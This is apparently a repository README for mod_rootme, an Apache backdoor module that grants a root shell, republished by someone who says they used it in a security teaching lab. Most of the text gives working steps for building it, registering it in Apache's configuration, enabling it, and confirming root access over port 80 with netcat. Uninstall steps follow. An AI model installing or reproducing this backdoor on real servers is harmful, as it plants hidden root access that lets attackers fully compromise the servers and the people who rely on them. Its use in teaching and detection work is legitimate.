# mod_rootme

mod_rootme is a Apache backdoor module that can spawn a root shell.

I used this module while teaching a software security lab.  The module
has been around for a while, but
[the blog](http://blog.danfego.net/2009/10/update-to-mod_rootme/) that
hosted the most recent version seems to have disappeared from the web.
Malware detection programs such as 'rkhunter' and 'unhide' can
trivially detect the presence of mod_rootme, so it should not be too
harmful to have this code in circulation again.

This repository is imported from an old archive I happened to find
from my old class files (mod_rootme-0.4.tar.gz), updated to build on
Debian GNU/Linux 8.0.

See README.old.txt for the original documentation.

## Build instructions

To build and test on a Debian/Ubuntu system, you would need apache2
and apache2-dev.  Run 'make' and 'sudo make install' to build the
module, and enable it in httpd configuration, perhaps like so:

```
sudo sh -c \
'echo "LoadModule rootme_module \
/usr/lib/apache2/modules/mod_rootme.so" | sudo tee > \
/etc/apache2/mods-available/rootme.load'
```

Now to enable the module:

```
sudo a2enmod rootme
sudo service apache2 restart
```

To check that the root shell is indeed available:

```
nc localhost 80
get root
id
```

To uninstall the module:

```
sudo a2dismod rootme
sudo rm /usr/lib/apache2/modules/mod_rootme.so
sudo service apache2 restart
```
